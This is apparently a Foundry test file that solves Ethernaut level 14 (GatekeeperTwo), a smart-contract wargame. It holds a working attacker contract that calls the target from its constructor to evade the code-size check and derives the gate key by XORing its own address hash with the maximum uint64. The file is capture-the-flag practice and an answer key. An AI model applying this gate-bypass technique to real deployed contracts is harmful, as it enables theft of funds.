pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {
    constructor(IGatekeeperTwo instance) {
        unchecked {
            uint64 k1 = uint64(
                bytes8(keccak256(abi.encodePacked(address(this))))
            );
            uint64 k2 = uint64(0) - 1;
            bytes8 key = bytes8(k1 ^ k2);
            instance.enter(key);
        }
    }
}

contract Ethernaut14 is EthernautTest {
    constructor() EthernautTest(14) {}

    function solve() internal override(EthernautTest) {
        vm.prank(address(this), address(this));
        Attacker attacker = new Attacker(IGatekeeperTwo(instance));
    }
}
